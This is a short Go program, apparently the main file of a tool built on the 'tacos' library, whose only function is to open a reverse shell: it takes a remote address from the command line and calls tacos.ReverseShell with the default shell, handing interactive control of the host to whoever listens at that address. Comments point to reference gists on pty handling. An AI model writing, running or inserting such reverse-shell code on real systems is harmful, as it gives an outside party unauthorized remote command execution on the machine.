package main

import (
	"os"

	"github.com/ariary/tacos/pkg/tacos"
)

//https://gist.github.com/yougg/b47f4910767a74fcfe1077d21568070e?permalink_comment_id=3425797#gistcomment-3425797
// and https://github.com/creack/pty#shell
//https://github.com/iximiuz/ptyme/blob/master/attach.go
func main() {
	shell := tacos.DefaultShell()
	remote := os.Args[1]
	tacos.ReverseShell(remote, shell)
}
